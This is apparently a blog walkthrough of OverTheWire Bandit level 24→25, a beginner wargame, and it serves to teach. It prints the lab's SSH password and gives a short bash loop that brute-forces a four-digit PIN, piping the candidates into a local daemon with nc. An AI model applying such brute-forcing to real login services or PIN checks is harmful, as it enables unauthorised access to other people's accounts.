---
author: Programmercave
date: "2019-12-26T00:00:00Z"
description: Learn linux command by playing Bandit wargame. The Bandit wargame is
  aimed at absolute beginners. It will teach the basics needed to be able to play
  other wargames. Below is the solution of Bandit Level 24 → Level 25. In this level
  you will learn how to bruteforce password and connect to a remote machine on a port.
  The passwords are hidden, so you have to find the passwords for next level yourself.
header-img: /assets/images/Bandit-Overthewire/overthewire_poster.jpg
tags:
- Linux
- OverTheWire-Bandit
- CTF
title: Bandit Level 24 → Level 25 | OverTheWire
---



Learn linux command by playing [Bandit](https://overthewire.org/wargames/bandit/) wargame. The Bandit wargame is aimed at absolute beginners. It will teach the basics needed to be able to play other wargames. Below is the solution of Bandit Level 24 → Level 25. 

In this level you will learn how to bruteforce password and connect to a remote machine on a port. 

The passwords are hidden, so you have to find the passwords for next level yourself.

![Bandit OverTheWire](/assets/images/Bandit-Overthewire/overthewire_poster.jpg)

### Previous Post

[Bandit Level 0 to Level 3](/Bandit-Level-0-to-Level-5-OverTheWire)<br/>
[Bandit Level 4 to Level 8](/Bandit-Level-4-to-Level-9-OverTheWire)<br/>
[Bandit Level 9 to Level 11](/Bandit-Level-9-to-Level-12-OverTheWire)<br/>
[Bandit Level 12 → Level 13](/Bandit-Level-12-Level-13-OverTheWire)<br/>
[Bandit Level 13 to Level 15](/Bandit-Level-13-to-Level-16-OverTheWire)<br/>
[Bandit Level 16 to Level 18](/Bandit-Level-16-to-Level-19-OverTheWire)<br/>
[Bandit Level 19 to Level 20](/Bandit-Level-19-to-Level-20-OverTheWire)<br/>
[Bandit Level 21 to Level 22](/Bandit-Level-21-to-Level-23-OverTheWire)<br/>
[Bandit Level 23 → Level 24](/Bandit-Level-23-Level-24-OverTheWire)

## [Bandit Level 24 → Level 25](https://overthewire.org/wargames/bandit/bandit25.html)

### Level Goal

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

### Solution : 

Command to connect remote host : `ssh bandit24@bandit.labs.overthewire.org -p 2220` password is `UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ` .

We can connect on port 30002 in a same way as we have done in level 20. We also have to pass password for current level and the 4 digit pin.The command is
```
nc localhost 30002  UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ****
```

To brute-force pin we wil write a shell script in */tmp/mydir123* directory.
 
The script is
``` 
#!/bin/bash
for i in {0000..9999}
do 
	echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
done
```

The name of the script is *bruteforcescript.sh* and file *combinations.txt* will store all combinations of 4 digit number with password for bandit20. First we have to make bruteforcescript.sh executable using command 
```
chmod 700 bruteforcescript.sh
./bruteforcescript.sh > combinations.txt
```

And the final command is
```
nc localhost 30002 < combinations.txt
```
The password for the next level is `****` .

![Bandit Level 24 25](/assets/images/Bandit-Overthewire/bandit_l2425_terminal.jpg)

Reference : [https://unix.stackexchange.com/questions/432904/brute-force-4-digit-pin-with-pass-using-shell-script](https://unix.stackexchange.com/questions/432904/brute-force-4-digit-pin-with-pass-using-shell-script)<br/>
[https://skyenet.tech/brute-force-password-attacking/](https://skyenet.tech/brute-force-password-attacking/)

### Next Post

[Bandit Level 25 to Level 26](/Bandit-Level-25-to-Level-26-OverTheWire)<br/>
[Bandit Level 27 to Level 31](/Bandit-Level-27-to-Level-31-OverTheWire)<br/>
[Bandit Level 32 → Level 33](/Bandit-Level-32-Level-33-OverTheWire)<br/>




